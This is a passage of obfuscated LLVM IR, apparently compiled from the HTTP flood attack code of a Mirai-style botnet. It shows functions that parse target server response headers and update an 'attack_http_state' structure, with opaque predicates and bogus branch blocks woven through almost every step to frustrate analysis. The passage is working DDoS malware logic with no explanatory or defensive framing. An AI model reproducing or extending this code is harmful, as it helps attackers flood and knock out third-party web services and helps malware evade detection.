; <label>:1804:                                   ; preds = %1786
  %1805 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %1806 = load i32, i32* %20, align 4
  %1807 = call i32 @util_memsearch(i8* %1805, i32 %1806, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1808 = icmp eq i32 %1807, -1
  br i1 %1808, label %1809, label %1829

; <label>:1809:                                   ; preds = %1804
  %1810 = load i32, i32* %20, align 4
  %1811 = icmp slt i32 %1810, 10240
  br i1 %1811, label %1812, label %1829

; <label>:1812:                                   ; preds = %1809
  %1813 = load i32, i32* @x.19
  %1814 = load i32, i32* @y.20
  %1815 = sub i32 %1813, 1
  %1816 = mul i32 %1813, %1815
  %1817 = urem i32 %1816, 2
  %1818 = icmp eq i32 %1817, 0
  %1819 = icmp slt i32 %1814, 10
  %1820 = or i1 %1818, %1819
  br i1 %1820, label %originalBB261, label %originalBB261alteredBB

originalBB261:                                    ; preds = %originalBB261alteredBB, %1812
  %1821 = load i32, i32* @x.19
  %1822 = load i32, i32* @y.20
  %1823 = sub i32 %1821, 1
  %1824 = mul i32 %1821, %1823
  %1825 = urem i32 %1824, 2
  %1826 = icmp eq i32 %1825, 0
  %1827 = icmp slt i32 %1822, 10
  %1828 = or i1 %1826, %1827
  br i1 %1828, label %originalBBpart2263, label %originalBB261alteredBB

originalBBpart2263:                               ; preds = %originalBB261
  br label %4291

; <label>:1829:                                   ; preds = %1809, %1804
  %1830 = load i32, i32* @x.19
  %1831 = load i32, i32* @y.20
  %1832 = sub i32 %1830, 1
  %1833 = mul i32 %1830, %1832
  %1834 = urem i32 %1833, 2
  %1835 = icmp eq i32 %1834, 0
  %1836 = icmp slt i32 %1831, 10
  %1837 = or i1 %1835, %1836
  br i1 %1837, label %originalBB265, label %originalBB265alteredBB

originalBB265:                                    ; preds = %originalBB265alteredBB, %1829
  %1838 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %1839 = load i32, i32* %20, align 4
  %1840 = call i32 @util_memsearch(i8* %1838, i32 %1839, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1841 = sext i32 %1840 to i64
  %1842 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %1841
  store i8 0, i8* %1842, align 1
  %1843 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %1844 = load i32, i32* %20, align 4
  %1845 = call i8* @table_retrieve_val(i32 46, i32* null)
  %1846 = call i32 @util_stristr(i8* %1843, i32 %1844, i8* %1845)
  %1847 = icmp ne i32 %1846, -1
  %1848 = load i32, i32* @x.19
  %1849 = load i32, i32* @y.20
  %1850 = sub i32 %1848, 1
  %1851 = mul i32 %1848, %1850
  %1852 = urem i32 %1851, 2
  %1853 = icmp eq i32 %1852, 0
  %1854 = icmp slt i32 %1849, 10
  %1855 = or i1 %1853, %1854
  br i1 %1855, label %originalBBpart2267, label %originalBB265alteredBB

originalBBpart2267:                               ; preds = %originalBB265
  br i1 %1847, label %1856, label %1875

; <label>:1856:                                   ; preds = %originalBBpart2267
  %1857 = load i32, i32* @x.19
  %1858 = load i32, i32* @y.20
  %1859 = sub i32 %1857, 1
  %1860 = mul i32 %1857, %1859
  %1861 = urem i32 %1860, 2
  %1862 = icmp eq i32 %1861, 0
  %1863 = icmp slt i32 %1858, 10
  %1864 = or i1 %1862, %1863
  br i1 %1864, label %originalBB269, label %originalBB269alteredBB

originalBB269:                                    ; preds = %originalBB269alteredBB, %1856
  %1865 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1866 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1865, i32 0, i32 11
  store i32 2, i32* %1866, align 4
  %1867 = load i32, i32* @x.19
  %1868 = load i32, i32* @y.20
  %1869 = sub i32 %1867, 1
  %1870 = mul i32 %1867, %1869
  %1871 = urem i32 %1870, 2
  %1872 = icmp eq i32 %1871, 0
  %1873 = icmp slt i32 %1868, 10
  %1874 = or i1 %1872, %1873
  br i1 %1874, label %originalBBpart2271, label %originalBB269alteredBB

originalBBpart2271:                               ; preds = %originalBB269
  br label %1875

; <label>:1875:                                   ; preds = %originalBBpart2271, %originalBBpart2267
  %1876 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %1877 = load i32, i32* %20, align 4
  %1878 = call i8* @table_retrieve_val(i32 45, i32* null)
  %1879 = call i32 @util_stristr(i8* %1876, i32 %1877, i8* %1878)
  %1880 = icmp ne i32 %1879, -1
  br i1 %1880, label %1881, label %1884

; <label>:1881:                                   ; preds = %1875
  %1882 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1883 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1882, i32 0, i32 11
  store i32 1, i32* %1883, align 4
  br label %1884

; <label>:1884:                                   ; preds = %1881, %1875
  %1885 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1886 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1885, i32 0, i32 12
  store i32 0, i32* %1886, align 4
  %1887 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %1888 = load i32, i32* %20, align 4
  %1889 = call i8* @table_retrieve_val(i32 44, i32* null)
  %1890 = call i32 @util_stristr(i8* %1887, i32 %1888, i8* %1889)
  %1891 = icmp ne i32 %1890, -1
  br i1 %1891, label %1892, label %1991

; <label>:1892:                                   ; preds = %1884
  %1893 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %1894 = load i32, i32* %20, align 4
  %1895 = call i8* @table_retrieve_val(i32 44, i32* null)
  %1896 = call i32 @util_stristr(i8* %1893, i32 %1894, i8* %1895)
  store i32 %1896, i32* %46, align 4
  %1897 = load i32, i32* %46, align 4
  %1898 = sext i32 %1897 to i64
  %1899 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %1898
  %1900 = load i8, i8* %1899, align 1
  %1901 = sext i8 %1900 to i32
  %1902 = icmp eq i32 %1901, 32
  br i1 %1902, label %1903, label %1906

; <label>:1903:                                   ; preds = %1892
  %1904 = load i32, i32* %46, align 4
  %1905 = add nsw i32 %1904, 1
  store i32 %1905, i32* %46, align 4
  br label %1906

; <label>:1906:                                   ; preds = %1903, %1892
  %1907 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %1908 = load i32, i32* %46, align 4
  %1909 = sext i32 %1908 to i64
  %1910 = getelementptr inbounds i8, i8* %1907, i64 %1909
  %1911 = load i32, i32* %20, align 4
  %1912 = load i32, i32* %46, align 4
  %1913 = sub nsw i32 %1911, %1912
  %1914 = call i32 @util_memsearch(i8* %1910, i32 %1913, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1914, i32* %47, align 4
  %1915 = load i32, i32* %47, align 4
  %1916 = icmp ne i32 %1915, -1
  br i1 %1916, label %1917, label %1990

; <label>:1917:                                   ; preds = %1906
  %1918 = load i32, i32* @x.19
  %1919 = load i32, i32* @y.20
  %1920 = sub i32 %1918, 1
  %1921 = mul i32 %1918, %1920
  %1922 = urem i32 %1921, 2
  %1923 = icmp eq i32 %1922, 0
  %1924 = icmp slt i32 %1919, 10
  %1925 = or i1 %1923, %1924
  br i1 %1925, label %originalBB273, label %originalBB273alteredBB

originalBB273:                                    ; preds = %originalBB273alteredBB, %1917
  %1926 = load i32, i32* %46, align 4
  %1927 = sext i32 %1926 to i64
  %1928 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %1927
  store i8* %1928, i8** %48, align 8
  %1929 = load i32, i32* %47, align 4
  %1930 = icmp sge i32 %1929, 2
  %1931 = load i32, i32* @x.19
  %1932 = load i32, i32* @y.20
  %1933 = sub i32 %1931, 1
  %1934 = mul i32 %1931, %1933
  %1935 = urem i32 %1934, 2
  %1936 = icmp eq i32 %1935, 0
  %1937 = icmp slt i32 %1932, 10
  %1938 = or i1 %1936, %1937
  br i1 %1938, label %originalBBpart2275, label %originalBB273alteredBB

originalBBpart2275:                               ; preds = %originalBB273
  br i1 %1930, label %1939, label %1942

; <label>:1939:                                   ; preds = %originalBBpart2275
  %1940 = load i32, i32* %47, align 4
  %1941 = sub nsw i32 %1940, 2
  store i32 %1941, i32* %47, align 4
  br label %1942

; <label>:1942:                                   ; preds = %1939, %originalBBpart2275
  %1943 = load i32, i32* @x.19
  %1944 = load i32, i32* @y.20
  %1945 = sub i32 %1943, 1
  %1946 = mul i32 %1943, %1945
  %1947 = urem i32 %1946, 2
  %1948 = icmp eq i32 %1947, 0
  %1949 = icmp slt i32 %1944, 10
  %1950 = or i1 %1948, %1949
  br i1 %1950, label %originalBB277, label %originalBB277alteredBB

originalBB277:                                    ; preds = %originalBB277alteredBB, %1942
  %1951 = load i32, i32* %46, align 4
  %1952 = load i32, i32* %47, align 4
  %1953 = add nsw i32 %1951, %1952
  %1954 = sext i32 %1953 to i64
  %1955 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %1954
  store i8 0, i8* %1955, align 1
  %1956 = load i8*, i8** %48, align 8
  %1957 = load i8*, i8** %48, align 8
  %1958 = call i32 @util_strlen(i8* %1957)
  %1959 = call i8* @table_retrieve_val(i32 43, i32* null)
  %1960 = call i32 @util_stristr(i8* %1956, i32 %1958, i8* %1959)
  %1961 = icmp ne i32 %1960, 0
  %1962 = load i32, i32* @x.19
  %1963 = load i32, i32* @y.20
  %1964 = sub i32 %1962, 1
  %1965 = mul i32 %1962, %1964
  %1966 = urem i32 %1965, 2
  %1967 = icmp eq i32 %1966, 0
  %1968 = icmp slt i32 %1963, 10
  %1969 = or i1 %1967, %1968
  br i1 %1969, label %originalBBpart2292, label %originalBB277alteredBB

originalBBpart2292:                               ; preds = %originalBB277
  br i1 %1961, label %1970, label %1973

; <label>:1970:                                   ; preds = %originalBBpart2292
  %1971 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1972 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1971, i32 0, i32 12
  store i32 1, i32* %1972, align 4
  br label %1973

; <label>:1973:                                   ; preds = %1970, %originalBBpart2292
  %1974 = load i32, i32* @x.19
  %1975 = load i32, i32* @y.20
  %1976 = sub i32 %1974, 1
  %1977 = mul i32 %1974, %1976
  %1978 = urem i32 %1977, 2
  %1979 = icmp eq i32 %1978, 0
  %1980 = icmp slt i32 %1975, 10
  %1981 = or i1 %1979, %1980
  br i1 %1981, label %originalBB294, label %originalBB294alteredBB

originalBB294:                                    ; preds = %originalBB294alteredBB, %1973
  %1982 = load i32, i32* @x.19
  %1983 = load i32, i32* @y.20
  %1984 = sub i32 %1982, 1
  %1985 = mul i32 %1982, %1984
  %1986 = urem i32 %1985, 2
  %1987 = icmp eq i32 %1986, 0
  %1988 = icmp slt i32 %1983, 10
  %1989 = or i1 %1987, %1988
  br i1 %1989, label %originalBBpart2296, label %originalBB294alteredBB

originalBBpart2296:                               ; preds = %originalBB294
  br label %1990

; <label>:1990:                                   ; preds = %originalBBpart2296, %1906
  br label %1991

; <label>:1991:                                   ; preds = %1990, %1884
  %1992 = load i32, i32* @x.19
  %1993 = load i32, i32* @y.20
  %1994 = sub i32 %1992, 1
  %1995 = mul i32 %1992, %1994
  %1996 = urem i32 %1995, 2
  %1997 = icmp eq i32 %1996, 0
  %1998 = icmp slt i32 %1993, 10
  %1999 = or i1 %1997, %1998
  br i1 %1999, label %originalBB298, label %originalBB298alteredBB

originalBB298:                                    ; preds = %originalBB298alteredBB, %1991
  %2000 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %2001 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2000, i32 0, i32 13
  store i32 0, i32* %2001, align 4
  %2002 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2003 = load i32, i32* %20, align 4
  %2004 = call i8* @table_retrieve_val(i32 41, i32* null)
  %2005 = call i32 @util_stristr(i8* %2002, i32 %2003, i8* %2004)
  %2006 = icmp ne i32 %2005, -1
  %2007 = load i32, i32* @x.19
  %2008 = load i32, i32* @y.20
  %2009 = sub i32 %2007, 1
  %2010 = mul i32 %2007, %2009
  %2011 = urem i32 %2010, 2
  %2012 = icmp eq i32 %2011, 0
  %2013 = icmp slt i32 %2008, 10
  %2014 = or i1 %2012, %2013
  br i1 %2014, label %originalBBpart2300, label %originalBB298alteredBB

originalBBpart2300:                               ; preds = %originalBB298
  br i1 %2006, label %2015, label %2098

; <label>:2015:                                   ; preds = %originalBBpart2300
  %2016 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2017 = load i32, i32* %20, align 4
  %2018 = call i8* @table_retrieve_val(i32 41, i32* null)
  %2019 = call i32 @util_stristr(i8* %2016, i32 %2017, i8* %2018)
  store i32 %2019, i32* %49, align 4
  %2020 = load i32, i32* %49, align 4
  %2021 = sext i32 %2020 to i64
  %2022 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %2021
  %2023 = load i8, i8* %2022, align 1
  %2024 = sext i8 %2023 to i32
  %2025 = icmp eq i32 %2024, 32
  br i1 %2025, label %2026, label %2029

; <label>:2026:                                   ; preds = %2015
  %2027 = load i32, i32* %49, align 4
  %2028 = add nsw i32 %2027, 1
  store i32 %2028, i32* %49, align 4
  br label %2029

; <label>:2029:                                   ; preds = %2026, %2015
  %2030 = load i32, i32* @x.19
  %2031 = load i32, i32* @y.20
  %2032 = sub i32 %2030, 1
  %2033 = mul i32 %2030, %2032
  %2034 = urem i32 %2033, 2
  %2035 = icmp eq i32 %2034, 0
  %2036 = icmp slt i32 %2031, 10
  %2037 = or i1 %2035, %2036
  br i1 %2037, label %originalBB302, label %originalBB302alteredBB

originalBB302:                                    ; preds = %originalBB302alteredBB, %2029
  %2038 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2039 = load i32, i32* %49, align 4
  %2040 = sext i32 %2039 to i64
  %2041 = getelementptr inbounds i8, i8* %2038, i64 %2040
  %2042 = load i32, i32* %20, align 4
  %2043 = load i32, i32* %49, align 4
  %2044 = sub nsw i32 %2042, %2043
  %2045 = call i32 @util_memsearch(i8* %2041, i32 %2044, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2045, i32* %50, align 4
  %2046 = load i32, i32* %50, align 4
  %2047 = icmp ne i32 %2046, -1
  %2048 = load i32, i32* @x.19
  %2049 = load i32, i32* @y.20
  %2050 = sub i32 %2048, 1
  %2051 = mul i32 %2048, %2050
  %2052 = urem i32 %2051, 2
  %2053 = icmp eq i32 %2052, 0
  %2054 = icmp slt i32 %2049, 10
  %2055 = or i1 %2053, %2054
  br i1 %2055, label %originalBBpart2310, label %originalBB302alteredBB

originalBBpart2310:                               ; preds = %originalBB302
  br i1 %2047, label %2056, label %2097

; <label>:2056:                                   ; preds = %originalBBpart2310
  %2057 = load i32, i32* %49, align 4
  %2058 = sext i32 %2057 to i64
  %2059 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %2058
  store i8* %2059, i8** %51, align 8
  %2060 = load i32, i32* %50, align 4
  %2061 = icmp sge i32 %2060, 2
  br i1 %2061, label %2062, label %2081

; <label>:2062:                                   ; preds = %2056
  %2063 = load i32, i32* @x.19
  %2064 = load i32, i32* @y.20
  %2065 = sub i32 %2063, 1
  %2066 = mul i32 %2063, %2065
  %2067 = urem i32 %2066, 2
  %2068 = icmp eq i32 %2067, 0
  %2069 = icmp slt i32 %2064, 10
  %2070 = or i1 %2068, %2069
  br i1 %2070, label %originalBB312, label %originalBB312alteredBB

originalBB312:                                    ; preds = %originalBB312alteredBB, %2062
  %2071 = load i32, i32* %50, align 4
  %2072 = sub nsw i32 %2071, 2
  store i32 %2072, i32* %50, align 4
  %2073 = load i32, i32* @x.19
  %2074 = load i32, i32* @y.20
  %2075 = sub i32 %2073, 1
  %2076 = mul i32 %2073, %2075
  %2077 = urem i32 %2076, 2
  %2078 = icmp eq i32 %2077, 0
  %2079 = icmp slt i32 %2074, 10
  %2080 = or i1 %2078, %2079
  br i1 %2080, label %originalBBpart2316, label %originalBB312alteredBB

originalBBpart2316:                               ; preds = %originalBB312
  br label %2081

; <label>:2081:                                   ; preds = %originalBBpart2316, %2056
  %2082 = load i32, i32* %49, align 4
  %2083 = load i32, i32* %50, align 4
  %2084 = add nsw i32 %2082, %2083
  %2085 = sext i32 %2084 to i64
  %2086 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %2085
  store i8 0, i8* %2086, align 1
  %2087 = load i8*, i8** %51, align 8
  %2088 = load i8*, i8** %51, align 8
  %2089 = call i32 @util_strlen(i8* %2088)
  %2090 = call i8* @table_retrieve_val(i32 42, i32* null)
  %2091 = call i32 @util_stristr(i8* %2087, i32 %2089, i8* %2090)
  %2092 = icmp ne i32 %2091, 0
  br i1 %2092, label %2093, label %2096

; <label>:2093:                                   ; preds = %2081
  %2094 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %2095 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2094, i32 0, i32 13
  store i32 1, i32* %2095, align 4
  br label %2096

; <label>:2096:                                   ; preds = %2093, %2081
  br label %2097

; <label>:2097:                                   ; preds = %2096, %originalBBpart2310
  br label %2098

; <label>:2098:                                   ; preds = %2097, %originalBBpart2300
  %2099 = load i32, i32* @x.19
  %2100 = load i32, i32* @y.20
  %2101 = sub i32 %2099, 1
  %2102 = mul i32 %2099, %2101
  %2103 = urem i32 %2102, 2
  %2104 = icmp eq i32 %2103, 0
  %2105 = icmp slt i32 %2100, 10
  %2106 = or i1 %2104, %2105
  br i1 %2106, label %originalBB318, label %originalBB318alteredBB

originalBB318:                                    ; preds = %originalBB318alteredBB, %2098
  %2107 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2108 = load i32, i32* %20, align 4
  %2109 = call i8* @table_retrieve_val(i32 40, i32* null)
  %2110 = call i32 @util_stristr(i8* %2107, i32 %2108, i8* %2109)
  %2111 = icmp ne i32 %2110, -1
  %2112 = load i32, i32* @x.19
  %2113 = load i32, i32* @y.20
  %2114 = sub i32 %2112, 1
  %2115 = mul i32 %2112, %2114
  %2116 = urem i32 %2115, 2
  %2117 = icmp eq i32 %2116, 0
  %2118 = icmp slt i32 %2113, 10
  %2119 = or i1 %2117, %2118
  br i1 %2119, label %originalBBpart2320, label %originalBB318alteredBB

originalBBpart2320:                               ; preds = %originalBB318
  br i1 %2111, label %2120, label %2197

; <label>:2120:                                   ; preds = %originalBBpart2320
  %2121 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2122 = load i32, i32* %20, align 4
  %2123 = call i8* @table_retrieve_val(i32 40, i32* null)
  %2124 = call i32 @util_stristr(i8* %2121, i32 %2122, i8* %2123)
  store i32 %2124, i32* %52, align 4
  %2125 = load i32, i32* %52, align 4
  %2126 = sext i32 %2125 to i64
  %2127 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %2126
  %2128 = load i8, i8* %2127, align 1
  %2129 = sext i8 %2128 to i32
  %2130 = icmp eq i32 %2129, 32
  br i1 %2130, label %2131, label %2150

; <label>:2131:                                   ; preds = %2120
  %2132 = load i32, i32* @x.19
  %2133 = load i32, i32* @y.20
  %2134 = sub i32 %2132, 1
  %2135 = mul i32 %2132, %2134
  %2136 = urem i32 %2135, 2
  %2137 = icmp eq i32 %2136, 0
  %2138 = icmp slt i32 %2133, 10
  %2139 = or i1 %2137, %2138
  br i1 %2139, label %originalBB322, label %originalBB322alteredBB

originalBB322:                                    ; preds = %originalBB322alteredBB, %2131
  %2140 = load i32, i32* %52, align 4
  %2141 = add nsw i32 %2140, 1
  store i32 %2141, i32* %52, align 4
  %2142 = load i32, i32* @x.19
  %2143 = load i32, i32* @y.20
  %2144 = sub i32 %2142, 1
  %2145 = mul i32 %2142, %2144
  %2146 = urem i32 %2145, 2
  %2147 = icmp eq i32 %2146, 0
  %2148 = icmp slt i32 %2143, 10
  %2149 = or i1 %2147, %2148
  br i1 %2149, label %originalBBpart2334, label %originalBB322alteredBB

originalBBpart2334:                               ; preds = %originalBB322
  br label %2150

; <label>:2150:                                   ; preds = %originalBBpart2334, %2120
  %2151 = load i32, i32* @x.19
  %2152 = load i32, i32* @y.20
  %2153 = sub i32 %2151, 1
  %2154 = mul i32 %2151, %2153
  %2155 = urem i32 %2154, 2
  %2156 = icmp eq i32 %2155, 0
  %2157 = icmp slt i32 %2152, 10
  %2158 = or i1 %2156, %2157
  br i1 %2158, label %originalBB336, label %originalBB336alteredBB

originalBB336:                                    ; preds = %originalBB336alteredBB, %2150
  %2159 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2160 = load i32, i32* %52, align 4
  %2161 = sext i32 %2160 to i64
  %2162 = getelementptr inbounds i8, i8* %2159, i64 %2161
  %2163 = load i32, i32* %20, align 4
  %2164 = load i32, i32* %52, align 4
  %2165 = sub nsw i32 %2163, %2164
  %2166 = call i32 @util_memsearch(i8* %2162, i32 %2165, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2166, i32* %53, align 4
  %2167 = load i32, i32* %53, align 4
  %2168 = icmp ne i32 %2167, -1
  %2169 = load i32, i32* @x.19
  %2170 = load i32, i32* @y.20
  %2171 = sub i32 %2169, 1
  %2172 = mul i32 %2169, %2171
  %2173 = urem i32 %2172, 2
  %2174 = icmp eq i32 %2173, 0
  %2175 = icmp slt i32 %2170, 10
  %2176 = or i1 %2174, %2175
  br i1 %2176, label %originalBBpart2344, label %originalBB336alteredBB

originalBBpart2344:                               ; preds = %originalBB336
  br i1 %2168, label %2177, label %2196

; <label>:2177:                                   ; preds = %originalBBpart2344
  %2178 = load i32, i32* %52, align 4
  %2179 = sext i32 %2178 to i64
  %2180 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %2179
  store i8* %2180, i8** %54, align 8
  %2181 = load i32, i32* %53, align 4
  %2182 = icmp sge i32 %2181, 2
  br i1 %2182, label %2183, label %2186

; <label>:2183:                                   ; preds = %2177
  %2184 = load i32, i32* %53, align 4
  %2185 = sub nsw i32 %2184, 2
  store i32 %2185, i32* %53, align 4
  br label %2186

; <label>:2186:                                   ; preds = %2183, %2177
  %2187 = load i32, i32* %52, align 4
  %2188 = load i32, i32* %53, align 4
  %2189 = add nsw i32 %2187, %2188
  %2190 = sext i32 %2189 to i64
  %2191 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %2190
  store i8 0, i8* %2191, align 1
  %2192 = load i8*, i8** %54, align 8
  %2193 = call i32 @util_atoi(i8* %2192, i32 10)
  %2194 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %2195 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2194, i32 0, i32 14
  store i32 %2193, i32* %2195, align 4
  br label %2196

; <label>:2196:                                   ; preds = %2186, %originalBBpart2344
  br label %2200

; <label>:2197:                                   ; preds = %originalBBpart2320
  %2198 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %2199 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2198, i32 0, i32 14
  store i32 0, i32* %2199, align 4
  br label %2200

; <label>:2200:                                   ; preds = %2197, %2196
  store i32 0, i32* %45, align 4
  br label %2201

; <label>:2201:                                   ; preds = %2552, %2200
  %2202 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2203 = load i32, i32* %45, align 4
  %2204 = sext i32 %2203 to i64
  %2205 = getelementptr inbounds i8, i8* %2202, i64 %2204
  %2206 = load i32, i32* %20, align 4
  %2207 = call i8* @table_retrieve_val(i32 39, i32* null)
  %2208 = call i32 @util_stristr(i8* %2205, i32 %2206, i8* %2207)
  %2209 = icmp ne i32 %2208, -1
  br i1 %2209, label %2210, label %2231

; <label>:2210:                                   ; preds = %2201
  %2211 = load i32, i32* @x.19
  %2212 = load i32, i32* @y.20
  %2213 = sub i32 %2211, 1
  %2214 = mul i32 %2211, %2213
  %2215 = urem i32 %2214, 2
  %2216 = icmp eq i32 %2215, 0
  %2217 = icmp slt i32 %2212, 10
  %2218 = or i1 %2216, %2217
  br i1 %2218, label %originalBB346, label %originalBB346alteredBB

originalBB346:                                    ; preds = %originalBB346alteredBB, %2210
  %2219 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %2220 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2219, i32 0, i32 15
  %2221 = load i32, i32* %2220, align 4
  %2222 = icmp slt i32 %2221, 5
  %2223 = load i32, i32* @x.19
  %2224 = load i32, i32* @y.20
  %2225 = sub i32 %2223, 1
  %2226 = mul i32 %2223, %2225
  %2227 = urem i32 %2226, 2
  %2228 = icmp eq i32 %2227, 0
  %2229 = icmp slt i32 %2224, 10
  %2230 = or i1 %2228, %2229
  br i1 %2230, label %originalBBpart2348, label %originalBB346alteredBB

originalBBpart2348:                               ; preds = %originalBB346
  br label %2231

; <label>:2231:                                   ; preds = %originalBBpart2348, %2201
  %2232 = phi i1 [ false, %2201 ], [ %2222, %originalBBpart2348 ]
  %2233 = load i32, i32* @x.19
  %2234 = load i32, i32* @y.20
  %2235 = sub i32 %2233, 1
  %2236 = mul i32 %2233, %2235
  %2237 = urem i32 %2236, 2
  %2238 = icmp eq i32 %2237, 0
  %2239 = icmp slt i32 %2234, 10
  %2240 = or i1 %2238, %2239
  br i1 %2240, label %originalBB350, label %originalBB350alteredBB

originalBB350:                                    ; preds = %originalBB350alteredBB, %2231
  %2241 = load i32, i32* @x.19
  %2242 = load i32, i32* @y.20
  %2243 = sub i32 %2241, 1
  %2244 = mul i32 %2241, %2243
  %2245 = urem i32 %2244, 2
  %2246 = icmp eq i32 %2245, 0
  %2247 = icmp slt i32 %2242, 10
  %2248 = or i1 %2246, %2247
  br i1 %2248, label %originalBBpart2352, label %originalBB350alteredBB

originalBBpart2352:                               ; preds = %originalBB350
  br i1 %2232, label %2249, label %2556

; <label>:2249:                                   ; preds = %originalBBpart2352
  %2250 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2251 = load i32, i32* %45, align 4
  %2252 = sext i32 %2251 to i64
  %2253 = getelementptr inbounds i8, i8* %2250, i64 %2252
  %2254 = load i32, i32* %20, align 4
  %2255 = call i8* @table_retrieve_val(i32 39, i32* null)
  %2256 = call i32 @util_stristr(i8* %2253, i32 %2254, i8* %2255)
  store i32 %2256, i32* %55, align 4
  %2257 = load i32, i32* %45, align 4
  %2258 = load i32, i32* %55, align 4
  %2259 = add nsw i32 %2257, %2258
  %2260 = sext i32 %2259 to i64
  %2261 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %2260
  %2262 = load i8, i8* %2261, align 1
  %2263 = sext i8 %2262 to i32
  %2264 = icmp eq i32 %2263, 32
  br i1 %2264, label %2265, label %2268

; <label>:2265:                                   ; preds = %2249
  %2266 = load i32, i32* %55, align 4
  %2267 = add nsw i32 %2266, 1
  store i32 %2267, i32* %55, align 4
  br label %2268

; <label>:2268:                                   ; preds = %2265, %2249
  %2269 = load i32, i32* @x.19
  %2270 = load i32, i32* @y.20
  %2271 = sub i32 %2269, 1
  %2272 = mul i32 %2269, %2271
  %2273 = urem i32 %2272, 2
  %2274 = icmp eq i32 %2273, 0
  %2275 = icmp slt i32 %2270, 10
  %2276 = or i1 %2274, %2275
  br i1 %2276, label %originalBB354, label %originalBB354alteredBB

originalBB354:                                    ; preds = %originalBB354alteredBB, %2268
  %2277 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2278 = load i32, i32* %45, align 4
  %2279 = sext i32 %2278 to i64
  %2280 = getelementptr inbounds i8, i8* %2277, i64 %2279
  %2281 = load i32, i32* %55, align 4
  %2282 = sext i32 %2281 to i64
  %2283 = getelementptr inbounds i8, i8* %2280, i64 %2282
  %2284 = load i32, i32* %20, align 4
  %2285 = load i32, i32* %45, align 4
  %2286 = sub nsw i32 %2284, %2285
  %2287 = load i32, i32* %55, align 4
  %2288 = sub nsw i32 %2286, %2287
  %2289 = call i32 @util_memsearch(i8* %2283, i32 %2288, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2289, i32* %56, align 4
  %2290 = load i32, i32* %56, align 4
  %2291 = icmp ne i32 %2290, -1
  %2292 = load i32, i32* @x.19
  %2293 = load i32, i32* @y.20
  %2294 = sub i32 %2292, 1
  %2295 = mul i32 %2292, %2294
  %2296 = urem i32 %2295, 2
  %2297 = icmp eq i32 %2296, 0
  %2298 = icmp slt i32 %2293, 10
  %2299 = or i1 %2297, %2298
  br i1 %2299, label %originalBBpart2377, label %originalBB354alteredBB

originalBBpart2377:                               ; preds = %originalBB354
  br i1 %2291, label %2300, label %2552

; <label>:2300:                                   ; preds = %originalBBpart2377
  %2301 = load i32, i32* @x.19
  %2302 = load i32, i32* @y.20
  %2303 = sub i32 %2301, 1
  %2304 = mul i32 %2301, %2303
  %2305 = urem i32 %2304, 2
  %2306 = icmp eq i32 %2305, 0
  %2307 = icmp slt i32 %2302, 10
  %2308 = or i1 %2306, %2307
  br i1 %2308, label %originalBB379, label %originalBB379alteredBB

originalBB379:                                    ; preds = %originalBB379alteredBB, %2300
